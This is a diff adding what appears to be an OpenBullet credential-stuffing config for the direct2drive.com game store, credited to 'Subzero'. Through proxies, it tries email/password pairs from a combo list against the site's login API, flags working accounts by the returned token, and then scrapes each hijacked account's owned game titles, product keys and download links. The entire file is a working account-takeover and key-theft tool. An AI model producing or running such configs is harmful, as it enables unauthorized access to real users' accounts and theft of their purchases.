@@ -1,0 +1,78 @@
+[SETTINGS]
+{
+  "Name": "http://www.direct2drive.com",
+  "SuggestedBots": 55,
+  "LastModified": "2018-11-07T13:05:44.6621487+00:00",
+  "AdditionalInfo": "",
+  "Author": "Subzero",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [
+    {
+      "SliceName": "PASS",
+      "RuleType": 2,
+      "RuleString": "8",
+      "Id": 299775977
+    },
+    {
+      "SliceName": "PASS",
+      "RuleType": 3,
+      "RuleString": "16",
+      "Id": 1408357844
+    },
+    {
+      "SliceName": "PASS",
+      "RuleType": 0,
+      "RuleString": "Digit",
+      "Id": 1221246855
+    }
+  ],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#Prima_Richiesta REQUEST POST "https://www.direct2drive.com/backend/api/account/login" AutoRedirect=TRUE 
+  CONTENT "email=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://www.direct2drive.com/channel.html?no-cache=no-cache" 
+  HEADER "fp: NjU4MTY0NjU5" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Authentication Failed: Invalid Email Address or Password" 
+  KEYCHAIN Success OR 
+    KEY "\"token\":\"" 
+#Check_Token PARSE "<SOURCE>" JSON "token" Recursive=FALSE -> VAR "Token" "" "" 
+#Check_Purchase_Amount PARSE "<SOURCE>" JSON "purchase_amount" Recursive=FALSE -> CAP "Purchase Amount" "" "" 
+#Check_Username PARSE "<SOURCE>" JSON "userName" Recursive=FALSE -> CAP "Username" "" "" 
+#Second_Request_(INFO) REQUEST GET "https://www.direct2drive.com/backend/api/account/inventories?page=1&per_page=100&purchase_type=all" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://www.direct2drive.com/" 
+  HEADER "fp: NjU4MTY0NjU5" 
+  HEADER "Authorization: Bearer <Token>" 
+#Check_Games PARSE "<SOURCE>" JSON "count" Recursive=FALSE -> CAP "GiochiPosseduti" "" "" 
+#Check_Free PARSE "<SOURCE>" JSON "count" Recursive=FALSE -> VAR "CheckFree" "" "" 
+#Check_Response_Free KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "<CheckFree>" EqualTo "0" 
+#Check_Nomi_Giochi PARSE "<SOURCE>" REGEX "\\"title\\":\\"([^\\"]*)\\",\\"uri" "[1]" Recursive=TRUE -> CAP "Nomi" "" "" 
+#Check_Chiave PARSE "<SOURCE>" REGEX "\\"key\":\"(\\\"|)([^(\"|\\)]*)" "[2]" Recursive=TRUE -> CAP "Key" "" "" 
+#Check_Download PARSE "<SOURCE>" LR "\"location\":\"" "\",\"size" Recursive=TRUE -> CAP "" "" "" 
